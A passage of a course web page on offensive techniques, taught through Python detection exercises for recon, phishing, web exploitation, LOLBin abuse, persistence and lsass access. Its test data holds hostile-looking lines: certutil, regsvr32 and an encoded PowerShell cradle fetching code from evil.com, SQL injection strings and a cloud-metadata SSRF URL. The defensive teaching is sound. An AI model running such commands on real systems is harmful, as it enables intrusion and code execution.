@@ -1,0 +1,1168 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Week 06 — Offensive Techniques</title>
+<link rel="stylesheet" href="style.css">
+<script src="app.js" defer></script></head>
+<body data-site="cyber">
+<header class="top"><div class="in">
+<a class="brand" href="index.html">Cyber Track</a>
+<a href="index.html">Weeks</a><a href="play.html">Playground</a><a href="../index.html">All sites</a>
+<span class="sp"></span><span class="prog" id="prog"></span>
+</div></header>
+<main>
+<h1>Week 06 — Offensive Techniques</h1><div class="toc"><a class="btn ghost" href="#day-1">Day 1</a><a class="btn ghost" href="#day-2">Day 2</a><a class="btn ghost" href="#day-3">Day 3</a><a class="btn ghost" href="#day-4">Day 4</a><a class="btn ghost" href="#day-5">Day 5</a></div><p class="note">Done this week: <span data-week-count="06" data-size="5"></span></p><p class="note">Code blocks run in your browser. <button class="ghost" id="resetpy" type="button">Reset Python session</button></p><h1>Week 06 — Offensive Techniques</h1>
+<h2>Metadata</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Phase</td>
+<td>Phase 2 — Attacker Mindset</td>
+</tr>
+<tr>
+<td>Cert Alignment</td>
+<td>BTL1: Attack lifecycle, exploitation techniques / SC-200: N/A (context) / GCIA: N/A</td>
+</tr>
+<tr>
+<td>Royal Road</td>
+<td>5 Sigma rule skeletons (metadata + detection logic) in <code>rules/</code> folder</td>
+</tr>
+<tr>
+<td>Prerequisites</td>
+<td>W01 Networking, W02 Windows OS, W03 Linux OS, W04 Identity, W05 ATT&amp;CK</td>
+</tr>
+<tr>
+<td>Est. Hours</td>
+<td>8–10 hrs</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="day-1">Day 1 — Reconnaissance and Initial Access</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="06-1"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=JEtfeSHCe_Q" target="_blank" rel="noopener"><b>MITRE ATT&amp;CK Framework - Initial Access</b><small>Amy Stokes-Waters</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=offensive%20security%20techniques%20reconnaissance%20initial%20access%20MITRE%20ATT%26CK" target="_blank" rel="noopener">offensive security techniques reconnaissance initial access MITRE ATT&amp;CK</a></p></div>
+<hr />
+<h3>Concept 1 — Passive vs Active Reconnaissance</h3>
+<p>Reconnaissance is the attacker's first step: gather information without getting caught. Passive recon means querying public sources — DNS records, LinkedIn org charts, GitHub repos, certificate transparency logs, Shodan scans — without touching the target's infrastructure. The target cannot log your activity. Active recon means probing directly: Nmap scans, banner grabbing, directory bruteforce. This generates log entries and firewall alerts.</p>
+<p>From a defender's perspective this is like auditing your own data warehouse's public footprint. Passive recon is an attacker reading your open API documentation. Active recon is an attacker running <code>SHOW TABLES</code> against a misconfigured endpoint you forgot was public.</p>
+<p>ATT&amp;CK coverage: T1590 (Gather Victim Network Info), T1591 (Gather Victim Org Info), T1596 (Search Open Technical Databases), T1595 (Active Scanning).</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import subprocess
+import json
+
+def passive_recon_report(domain: str) -&gt; dict:
+    &quot;&quot;&quot;Simulate what an attacker (or red team) would collect passively.&quot;&quot;&quot;
+    report = {&quot;domain&quot;: domain, &quot;findings&quot;: []}
+
+    # Certificate transparency: crt.sh (attacker queries this publicly)
+    # In a real engagement: requests.get(f&quot;https://crt.sh/?q={domain}&amp;output=json&quot;)
+    # Simulated result:
+    subdomains_from_ct = [
+        f&quot;mail.{domain}&quot;, f&quot;vpn.{domain}&quot;, f&quot;dev.{domain}&quot;,
+        f&quot;staging.{domain}&quot;, f&quot;api.{domain}&quot;
+    ]
+    report[&quot;findings&quot;].append({
+        &quot;source&quot;: &quot;certificate_transparency&quot;,
+        &quot;data&quot;: subdomains_from_ct,
+        &quot;risk&quot;: &quot;dev/staging subdomains often have weaker auth&quot;
+    })
+
+    # MX records reveal email provider → phishing infrastructure choice
+    report[&quot;findings&quot;].append({
+        &quot;source&quot;: &quot;dns_mx&quot;,
+        &quot;data&quot;: [f&quot;mail.{domain}&quot;, f&quot;smtp.{domain}&quot;],
+        &quot;risk&quot;: &quot;on-prem mail server = potential CVE exposure&quot;
+    })
+
+    return report
+
+report = passive_recon_report(&quot;targetcorp.com&quot;)
+print(json.dumps(report, indent=2))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a function <code>classify_recon_event(log_line: str) -&gt; dict</code> that takes a raw server log line and returns <code>{&quot;type&quot;: &quot;active&quot;|&quot;passive&quot;, &quot;technique&quot;: str, &quot;confidence&quot;: &quot;high&quot;|&quot;medium&quot;}</code>. Test it against these inputs:</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>log_lines = [
+    &quot;192.168.1.50 - - [10/Apr/2024 14:22:01] &#x27;GET /.git/config HTTP/1.1&#x27; 200&quot;,
+    &quot;192.168.1.50 - - [10/Apr/2024 14:22:05] &#x27;GET /admin/ HTTP/1.1&#x27; 404&quot;,
+    &quot;192.168.1.50 - - [10/Apr/2024 14:22:10] &#x27;GET /wp-admin/ HTTP/1.1&#x27; 404&quot;,
+    &quot;192.168.1.50 - - [10/Apr/2024 14:22:15] &#x27;GET /?id=1 HTTP/1.1&#x27; 200&quot;,
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>{&quot;type&quot;: &quot;active&quot;, &quot;technique&quot;: &quot;T1595.003 Wordlist Scanning&quot;, &quot;confidence&quot;: &quot;high&quot;}
+{&quot;type&quot;: &quot;active&quot;, &quot;technique&quot;: &quot;T1595.003 Wordlist Scanning&quot;, &quot;confidence&quot;: &quot;high&quot;}
+{&quot;type&quot;: &quot;active&quot;, &quot;technique&quot;: &quot;T1595.003 Wordlist Scanning&quot;, &quot;confidence&quot;: &quot;medium&quot;}
+{&quot;type&quot;: &quot;active&quot;, &quot;technique&quot;: &quot;T1190 Exploit Public App&quot;, &quot;confidence&quot;: &quot;medium&quot;}
+</code></pre><hr />
+<h3>Concept 2 — Phishing and Spearphishing (T1566)</h3>
+<p>Phishing is the dominant initial access vector across all threat actor groups. Standard phishing uses mass email with malicious attachments or links. Spearphishing (T1566.001 — attachment, T1566.002 — link) is targeted: the attacker customizes the lure based on passive recon. A message to a finance employee referencing a real vendor invoice is far more effective than a generic bank alert.</p>
+<p>In data engineering terms: phishing is like a SQL injection payload designed specifically for your schema — the attacker already knows your table names and crafts the query accordingly.</p>
+<p>Defender's view: you cannot stop all phishing at the network perimeter. You detect it through email gateway logs (suspicious sender domains, lookalike domains, attachment hash reputation), endpoint logs (document spawning child process — Office → cmd.exe is a classic chain), and user reports.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+from datetime import datetime
+
+PHISHING_INDICATORS = {
+    &quot;lookalike_domains&quot;: re.compile(
+        r&quot;(micros0ft|micosoft|paypa1|g00gle|linkedln|arnazon)\.com&quot;
+    ),
+    &quot;suspicious_attachments&quot;: re.compile(
+        r&quot;\.(exe|vbs|js|hta|bat|ps1|lnk|iso|img)$&quot;, re.IGNORECASE
+    ),
+    &quot;office_macros&quot;: re.compile(
+        r&quot;\.(doc|xls|ppt)m$&quot;, re.IGNORECASE
+    ),
+    &quot;credential_keywords&quot;: re.compile(
+        r&quot;(password|verify.{0,20}account|suspended|urgent.{0,30}action)&quot;,
+        re.IGNORECASE
+    ),
+}
+
+def score_email(subject: str, sender: str, attachment: str) -&gt; dict:
+    score = 0
+    hits = []
+    if PHISHING_INDICATORS[&quot;lookalike_domains&quot;].search(sender):
+        score += 40
+        hits.append(&quot;lookalike_domain&quot;)
+    if attachment and PHISHING_INDICATORS[&quot;suspicious_attachments&quot;].search(attachment):
+        score += 35
+        hits.append(&quot;suspicious_attachment&quot;)
+    if attachment and PHISHING_INDICATORS[&quot;office_macros&quot;].search(attachment):
+        score += 25
+        hits.append(&quot;macro_enabled_office&quot;)
+    if PHISHING_INDICATORS[&quot;credential_keywords&quot;].search(subject):
+        score += 20
+        hits.append(&quot;credential_lure_subject&quot;)
+    return {
+        &quot;score&quot;: min(score, 100),
+        &quot;verdict&quot;: &quot;block&quot; if score &gt;= 50 else &quot;quarantine&quot; if score &gt;= 25 else &quot;allow&quot;,
+        &quot;indicators&quot;: hits,
+    }
+
+samples = [
+    (&quot;Your account has been suspended - urgent action required&quot;,
+     &quot;support@micros0ft.com&quot;, &quot;invoice.xlsm&quot;),
+    (&quot;Q3 budget review&quot;, &quot;cfo@company.com&quot;, &quot;budget_q3.xlsx&quot;),
+    (&quot;Please verify your password&quot;, &quot;it@corp-helpdesk.net&quot;, &quot;reset_form.hta&quot;),
+]
+
+for subject, sender, attachment in samples:
+    print(score_email(subject, sender, attachment))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add a function <code>detect_office_child_spawn(parent: str, child: str) -&gt; bool</code> that returns <code>True</code> when an Office application (winword.exe, excel.exe, powerpnt.exe) spawns a suspicious child process (cmd.exe, powershell.exe, wscript.exe, mshta.exe, rundll32.exe). Test:</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>process_pairs = [
+    (&quot;WINWORD.EXE&quot;, &quot;cmd.exe&quot;),
+    (&quot;EXCEL.EXE&quot;, &quot;POWERSHELL.EXE&quot;),
+    (&quot;chrome.exe&quot;, &quot;cmd.exe&quot;),
+    (&quot;WINWORD.EXE&quot;, &quot;ACRORD32.EXE&quot;),
+    (&quot;EXCEL.EXE&quot;, &quot;wscript.exe&quot;),
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>True   # Word → cmd
+True   # Excel → PowerShell
+False  # Chrome → cmd (not an Office spawn)
+False  # Word → Acrobat (benign child)
+True   # Excel → WScript
+</code></pre><hr />
+<h3>Concept 3 — Exploitation Basics: Public-Facing Applications (T1190)</h3>
+<p>Exploitation of public-facing applications means finding and abusing vulnerabilities in internet-exposed services: web servers, VPNs, exchange servers, firewalls. The attacker sends a crafted payload that causes the application to execute unintended code or expose data. Common classes: SQLi (T1190 via web app), CVE-based RCE (specific version vulnerabilities), deserialization flaws, SSRF.</p>
+<p>Think of SSRF as an attacker tricking your ETL pipeline's HTTP fetch step into making requests to internal services — your pipeline becomes a proxy from the internet to your internal network.</p>
+<p>From a detection standpoint, you look for: 400/500-class HTTP error spikes, unusual user-agent strings, large POST bodies to unexpected endpoints, SQL keywords in URI parameters, and outbound connections from application servers that should not be making external calls.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+from collections import Counter
+
+# Simulated web access log entries
+WEB_LOGS = [
+    {&quot;time&quot;: &quot;2024-04-10T09:00:01&quot;, &quot;src_ip&quot;: &quot;203.0.113.5&quot;, &quot;method&quot;: &quot;GET&quot;,
+     &quot;uri&quot;: &quot;/products?id=1&quot;, &quot;status&quot;: 200, &quot;ua&quot;: &quot;Mozilla/5.0&quot;},
+    {&quot;time&quot;: &quot;2024-04-10T09:00:02&quot;, &quot;src_ip&quot;: &quot;203.0.113.5&quot;, &quot;method&quot;: &quot;GET&quot;,
+     &quot;uri&quot;: &quot;/products?id=1 UNION SELECT null,username,password FROM users--&quot;,
+     &quot;status&quot;: 500, &quot;ua&quot;: &quot;sqlmap/1.7&quot;},
+    {&quot;time&quot;: &quot;2024-04-10T09:00:03&quot;, &quot;src_ip&quot;: &quot;203.0.113.5&quot;, &quot;method&quot;: &quot;GET&quot;,
+     &quot;uri&quot;: &quot;/products?id=1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;, &quot;status&quot;: 500, &quot;ua&quot;: &quot;sqlmap/1.7&quot;},
+    {&quot;time&quot;: &quot;2024-04-10T09:00:05&quot;, &quot;src_ip&quot;: &quot;198.51.100.8&quot;, &quot;method&quot;: &quot;POST&quot;,
+     &quot;uri&quot;: &quot;/api/fetch?url=http://169.254.169.254/latest/meta-data/&quot;, &quot;status&quot;: 200,
+     &quot;ua&quot;: &quot;python-requests/2.28&quot;},
+]
+
+SQL_PATTERNS = re.compile(
+    r&quot;(union\s+select|or\s+&#x27;1&#x27;=&#x27;1|--|;DROP|WAITFOR\s+DELAY|1=1)&quot;,
+    re.IGNORECASE
+)
+SSRF_PATTERNS = re.compile(
+    r&quot;(169\.254\.|127\.0\.0\.|10\.\d+\.\d+\.\d+|192\.168\.|file://|gopher://)&quot;,
+    re.IGNORECASE
+)
+
+def classify_web_attacks(logs: list) -&gt; list:
+    alerts = []
+    for entry in logs:
+        uri = entry[&quot;uri&quot;]
+        if SQL_PATTERNS.search(uri):
+            alerts.append({**entry, &quot;alert&quot;: &quot;SQLi attempt&quot;, &quot;technique&quot;: &quot;T1190&quot;})
+        elif SSRF_PATTERNS.search(uri):
+            alerts.append({**entry, &quot;alert&quot;: &quot;SSRF attempt&quot;, &quot;technique&quot;: &quot;T1190&quot;})
+    return alerts
+
+for alert in classify_web_attacks(WEB_LOGS):
+    print(f&quot;[{alert[&#x27;technique&#x27;]}] {alert[&#x27;alert&#x27;]} from {alert[&#x27;src_ip&#x27;]}: {alert[&#x27;uri&#x27;][:60]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a function <code>spike_detector(logs: list, window_seconds: int, threshold: int) -&gt; list</code> that groups 500-class error responses by source IP and returns IPs that exceed <code>threshold</code> errors within any <code>window_seconds</code> window. Use only built-in Python (no pandas). Test against a log list where <code>203.0.113.5</code> has 15 errors in 10 seconds and <code>198.51.100.8</code> has 3 errors.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import random
+from datetime import datetime, timedelta
+
+base_time = datetime(2024, 4, 10, 9, 0, 0)
+test_logs = (
+    [{&quot;time&quot;: (base_time + timedelta(seconds=i)).isoformat(),
+      &quot;src_ip&quot;: &quot;203.0.113.5&quot;, &quot;status&quot;: 500} for i in range(15)] +
+    [{&quot;time&quot;: (base_time + timedelta(seconds=i*5)).isoformat(),
+      &quot;src_ip&quot;: &quot;198.51.100.8&quot;, &quot;status&quot;: 500} for i in range(3)]
+)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[{&quot;ip&quot;: &quot;203.0.113.5&quot;, &quot;error_count&quot;: 15, &quot;window_start&quot;: &quot;2024-04-10T09:00:00&quot;, &quot;verdict&quot;: &quot;likely_scanner&quot;}]
+</code></pre><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> Automated vulnerability discovery and exploit generation<br />
+<strong>Threat:</strong> Attackers use LLMs to speed up recon (generating targeted phishing lures from LinkedIn scrapes), find CVE descriptions and generate PoC exploits for specific versions, and personalize spearphishing at scale with zero additional effort<br />
+<strong>Opportunity:</strong> Defenders use LLMs to classify web log anomalies at scale, generate phishing awareness training examples, and enrich vulnerability scan results with exploitation likelihood scoring<br />
+<strong>Prompt to try:</strong> <code>&quot;Given these 10 HTTP log lines from our web application, identify which ones indicate active exploitation attempts and map each to the most likely ATT&amp;CK technique. For each finding, explain what the attacker was trying to accomplish.&quot;</code></p>
+<hr />
+<h2 id="day-2">Day 2 — Execution and Persistence</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="06-2"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><p class="alt">Find a video: <a href="https://www.youtube.com/results?search_query=malware%20persistence%20techniques%20Windows%20registry%20scheduled%20tasks%20detection" target="_blank" rel="noopener">malware persistence techniques Windows registry scheduled tasks detection</a></p></div>
+<hr />
+<h3>Concept 1 — Living-Off-the-Land Binaries (LOLBins)</h3>
+<p>LOLBins are legitimate Windows binaries that attackers abuse to execute malicious code without dropping a custom executable. Because these are signed Microsoft tools, they bypass application allowlisting and most AV scanners. The attacker &quot;lives off the land&quot; — uses what is already there.</p>
+<p>Common LOLBins: <code>certutil.exe</code> (download files with <code>-urlcache</code>), <code>mshta.exe</code> (execute HTA scripts), <code>regsvr32.exe</code> (execute COM scriptlets via scrobj.dll), <code>wmic.exe</code> (spawn processes via <code>wmic process call create</code>), <code>rundll32.exe</code> (load and execute DLLs), <code>bitsadmin.exe</code> (download files via BITS).</p>
+<p>This is the attacker equivalent of a data pipeline that achieves its goal by abusing built-in database functions rather than writing a stored procedure — harder to detect, harder to block.</p>
+<p>Detection: monitor for these binaries executing with unusual parent processes or command-line arguments that include URLs, base64-encoded strings, or network paths.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+
+LOLBIN_RULES = {
+    &quot;certutil_download&quot;: {
+        &quot;process&quot;: &quot;certutil.exe&quot;,
+        &quot;cmdline_pattern&quot;: re.compile(r&quot;-urlcache|-decode|-encode&quot;, re.IGNORECASE),
+        &quot;technique&quot;: &quot;T1105&quot;,
+        &quot;severity&quot;: &quot;high&quot;,
+    },
+    &quot;mshta_remote&quot;: {
+        &quot;process&quot;: &quot;mshta.exe&quot;,
+        &quot;cmdline_pattern&quot;: re.compile(r&quot;http[s]?://|\\\\[^\\]&quot;, re.IGNORECASE),
+        &quot;technique&quot;: &quot;T1218.005&quot;,
+        &quot;severity&quot;: &quot;high&quot;,
+    },
+    &quot;regsvr32_scrobj&quot;: {
+        &quot;process&quot;: &quot;regsvr32.exe&quot;,
+        &quot;cmdline_pattern&quot;: re.compile(r&quot;scrobj\.dll|/s\s+/n\s+/u&quot;, re.IGNORECASE),
+        &quot;technique&quot;: &quot;T1218.010&quot;,
+        &quot;severity&quot;: &quot;high&quot;,
+    },
+    &quot;wmic_spawn&quot;: {
+        &quot;process&quot;: &quot;wmic.exe&quot;,
+        &quot;cmdline_pattern&quot;: re.compile(r&quot;process\s+call\s+create&quot;, re.IGNORECASE),
+        &quot;technique&quot;: &quot;T1047&quot;,
+        &quot;severity&quot;: &quot;high&quot;,
+    },
+    &quot;bitsadmin_transfer&quot;: {
+        &quot;process&quot;: &quot;bitsadmin.exe&quot;,
+        &quot;cmdline_pattern&quot;: re.compile(r&quot;/transfer|/addfile|/resume&quot;, re.IGNORECASE),
+        &quot;technique&quot;: &quot;T1197&quot;,
+        &quot;severity&quot;: &quot;medium&quot;,
+    },
+}
+
+def detect_lolbin(process_name: str, cmdline: str) -&gt; dict | None:
+    pname = process_name.lower()
+    for rule_name, rule in LOLBIN_RULES.items():
+        if rule[&quot;process&quot;].lower() in pname:
+            if rule[&quot;cmdline_pattern&quot;].search(cmdline):
+                return {
+                    &quot;rule&quot;: rule_name,
+                    &quot;technique&quot;: rule[&quot;technique&quot;],
+                    &quot;severity&quot;: rule[&quot;severity&quot;],
+                    &quot;process&quot;: process_name,
+                    &quot;cmdline&quot;: cmdline,
+                }
+    return None
+
+test_events = [
+    (&quot;certutil.exe&quot;, &quot;certutil -urlcache -split -f http://evil.com/beacon.exe C:\\Windows\\Temp\\b.exe&quot;),
+    (&quot;mshta.exe&quot;, &quot;mshta.exe http://192.168.1.100/payload.hta&quot;),
+    (&quot;notepad.exe&quot;, &quot;notepad.exe C:\\readme.txt&quot;),
+    (&quot;regsvr32.exe&quot;, &quot;/s /n /u /i:http://evil.com/file.sct scrobj.dll&quot;),
+]
+
+for proc, cmd in test_events:
+    result = detect_lolbin(proc, cmd)
+    if result:
+        print(f&quot;[{result[&#x27;severity&#x27;].upper()}] {result[&#x27;rule&#x27;]} → {result[&#x27;technique&#x27;]}&quot;)
+    else:
+        print(&quot;clean&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Extend <code>detect_lolbin</code> to also flag <code>powershell.exe</code> with base64-encoded commands (the <code>-EncodedCommand</code> / <code>-enc</code> flag). A base64-encoded command will be a long string of alphanumeric characters following <code>-enc</code> or <code>-EncodedCommand</code>. Add a decode step: if the base64 decodes to text containing <code>IEX</code>, <code>DownloadString</code>, <code>Invoke-Expression</code>, or <code>Bypass</code>, set severity to <code>&quot;critical&quot;</code>.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import base64
+
+encoded_payload = base64.b64encode(
+    &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://evil.com/payload.ps1&#x27;)&quot;.encode(&quot;utf-16-le&quot;)
+).decode()
+
+test_events_enc = [
+    (&quot;powershell.exe&quot;, f&quot;-nop -w hidden -enc {encoded_payload}&quot;),
+    (&quot;powershell.exe&quot;, &quot;-nop Get-Process&quot;),
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[CRITICAL] powershell_encoded_command → T1059.001  (decoded: IEX...DownloadString...)
+clean
+</code></pre><hr />
+<h3>Concept 2 — Persistence Mechanisms: Scheduled Tasks and Services (T1053, T1543)</h3>
+<p>An attacker who gets initial access needs to survive reboots. The two most common persistence mechanisms on Windows are scheduled tasks and malicious services. A scheduled task can run on logon, system startup, or at a fixed interval. A malicious service auto-starts with Windows and runs under SYSTEM context if the attacker can create it with sufficient privilege.</p>
+<p>These are the attacker equivalent of a cron job or a daemon in your data platform — a scheduled task is just <code>cron</code>, a malicious service is just <code>systemd</code> running the wrong binary.</p>
+<p>Windows Event Log coverage: EID 4698 (scheduled task created), EID 4702 (task updated), EID 4699 (task deleted). Sysmon EID 11 (file created) + EID 1 (process created by schtasks.exe). For services: EID 7045 (new service installed), EID 7040 (service start type changed).</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Simulated parsed Windows event log entries
+EVENTS = [
+    {&quot;eid&quot;: 4698, &quot;time&quot;: &quot;2024-04-10T02:00:00&quot;, &quot;user&quot;: &quot;SYSTEM&quot;,
+     &quot;task_name&quot;: &quot;\\Microsoft\\Windows\\UpdateCheck&quot;,
+     &quot;task_content&quot;: &quot;&lt;Command&gt;C:\\Windows\\Temp\\update.exe&lt;/Command&gt;&quot;},
+    {&quot;eid&quot;: 4698, &quot;time&quot;: &quot;2024-04-10T02:01:00&quot;, &quot;user&quot;: &quot;bob&quot;,
+     &quot;task_name&quot;: &quot;\\Microsoft\\Windows\\WindowsUpdate&quot;,
+     &quot;task_content&quot;: &quot;&lt;Command&gt;C:\\Windows\\System32\\wuauclt.exe&lt;/Command&gt;&quot;},
+    {&quot;eid&quot;: 7045, &quot;time&quot;: &quot;2024-04-10T02:02:00&quot;, &quot;user&quot;: &quot;SYSTEM&quot;,
+     &quot;service_name&quot;: &quot;WindowsDefenderUpdate&quot;,
+     &quot;service_path&quot;: &quot;C:\\ProgramData\\svchost.exe -k netsvcs&quot;},
+]
+
+SUSPICIOUS_PATHS = re.compile(
+    r&quot;(\\Temp\\|\\AppData\\|\\ProgramData\\|\\Users\\Public\\)&quot;,
+    re.IGNORECASE
+)
+MASQUERADE_NAMES = re.compile(
+    r&quot;(WindowsUpdate|Defender|MicrosoftEdge|OneDrive|Svchost)&quot;,
+    re.IGNORECASE
+)
+
+def analyze_persistence_event(event: dict) -&gt; dict | None:
+    alerts = []
+    content = event.get(&quot;task_content&quot;, &quot;&quot;) + event.get(&quot;service_path&quot;, &quot;&quot;)
+
+    if SUSPICIOUS_PATHS.search(content):
+        alerts.append(&quot;binary_in_suspicious_path&quot;)
+    if event.get(&quot;task_name&quot;) and MASQUERADE_NAMES.search(event[&quot;task_name&quot;]):
+        # Check if it&#x27;s the real path or impersonating
+        if SUSPICIOUS_PATHS.search(content):
+            alerts.append(&quot;masquerading_as_legitimate_name&quot;)
+    if event.get(&quot;service_name&quot;) and MASQUERADE_NAMES.search(event[&quot;service_name&quot;]):
+        if SUSPICIOUS_PATHS.search(content):
+            alerts.append(&quot;service_name_masquerade&quot;)
+
+    if alerts:
+        return {&quot;eid&quot;: event[&quot;eid&quot;], &quot;time&quot;: event[&quot;time&quot;], &quot;alerts&quot;: alerts,
+                &quot;technique&quot;: &quot;T1053.005&quot; if event[&quot;eid&quot;] in (4698, 4702) else &quot;T1543.003&quot;}
+    return None
+
+for event in EVENTS:
+    result = analyze_persistence_event(event)
+    if result:
+        print(f&quot;[ALERT] EID {result[&#x27;eid&#x27;]} {result[&#x27;technique&#x27;]}: {result[&#x27;alerts&#x27;]}&quot;)
+    else:
+        print(f&quot;[clean] EID {event[&#x27;eid&#x27;]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a function <code>task_baseline_diff(known_tasks: set, current_tasks: set) -&gt; dict</code> that compares a known-good snapshot of scheduled task names to a current scan and returns <code>{&quot;new&quot;: list, &quot;removed&quot;: list}</code>. Then write <code>flag_new_tasks(diff: dict, suspicious_keywords: list) -&gt; list</code> that returns only new tasks whose names contain any of the suspicious keywords.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>known_tasks = {
+    &quot;\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start&quot;,
+    &quot;\\Microsoft\\Windows\\Defrag\\ScheduledDefrag&quot;,
+    &quot;\\Microsoft\\Windows\\RecoveryEnvironment\\ScheduledMemoryDiagnostic&quot;,
+}
+current_tasks = {
+    &quot;\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start&quot;,
+    &quot;\\Microsoft\\Windows\\Defrag\\ScheduledDefrag&quot;,
+    &quot;\\Microsoft\\Windows\\UpdateCheck\\SvcRestarter&quot;,
+    &quot;\\TeamViewer\\TeamViewer_Task_NA&quot;,
+}
+suspicious_keywords = [&quot;update&quot;, &quot;svc&quot;, &quot;restart&quot;, &quot;check&quot;]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>new tasks: [&#x27;\\Microsoft\\Windows\\UpdateCheck\\SvcRestarter&#x27;, &#x27;\\TeamViewer\\TeamViewer_Task_NA&#x27;]
+suspicious new tasks: [&#x27;\\Microsoft\\Windows\\UpdateCheck\\SvcRestarter&#x27;]
+</code></pre><hr />
+<h3>Concept 3 — Fileless Malware and Memory-Only Execution</h3>
+<p>Fileless malware never writes a persistent binary to disk. It lives entirely in memory: PowerShell script blocks, reflective DLL injection, process hollowing (spawn a legitimate process suspended, overwrite its memory with malicious code, resume). This defeats file-based AV and forensic disk imaging — if the machine reboots, evidence is gone.</p>
+<p>Detection requires memory telemetry: Sysmon EID 8 (CreateRemoteThread), EID 10 (ProcessAccess with suspicious GrantedAccess), Windows Defender ATP process memory scanning, or EDR products. PowerShell Script Block Logging (EID 4104) captures code executed in memory even if never written to disk.</p>
+<p>Think of it like a query that runs entirely in memory with no temp table writes — you cannot find the query plan in any file, only in <code>pg_stat_activity</code> or an active trace.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Sysmon EID 10 (ProcessAccess) — lsass.exe access with suspicious GrantedAccess mask
+LSASS_ACCESS_EVENTS = [
+    {&quot;eid&quot;: 10, &quot;time&quot;: &quot;2024-04-10T03:00:00&quot;,
+     &quot;source_process&quot;: &quot;mimikatz.exe&quot;, &quot;target_process&quot;: &quot;lsass.exe&quot;,
+     &quot;granted_access&quot;: &quot;0x1fffff&quot;},
+    {&quot;eid&quot;: 10, &quot;time&quot;: &quot;2024-04-10T03:01:00&quot;,
+     &quot;source_process&quot;: &quot;MsMpEng.exe&quot;, &quot;target_process&quot;: &quot;lsass.exe&quot;,
+     &quot;granted_access&quot;: &quot;0x1000&quot;},
+    {&quot;eid&quot;: 10, &quot;time&quot;: &quot;2024-04-10T03:02:00&quot;,
+     &quot;source_process&quot;: &quot;svchost.exe&quot;, &quot;target_process&quot;: &quot;lsass.exe&quot;,
+     &quot;granted_access&quot;: &quot;0x1410&quot;},
+]
+
+# GrantedAccess masks that indicate credential dumping
+CREDENTIAL_DUMP_MASKS = {
+    &quot;0x1fffff&quot;: &quot;PROCESS_ALL_ACCESS&quot;,
+    &quot;0x1410&quot;: &quot;PROCESS_VM_READ + PROCESS_QUERY_INFORMATION&quot;,
+    &quot;0x1010&quot;: &quot;PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION&quot;,
+}
+
+# Processes that legitimately access lsass
+LSASS_LEGITIMATE_CALLERS = {
+    &quot;MsMpEng.exe&quot;, &quot;csrss.exe&quot;, &quot;wininit.exe&quot;,
+    &quot;services.exe&quot;, &quot;lsass.exe&quot;, &quot;svchost.exe&quot;
+}
+
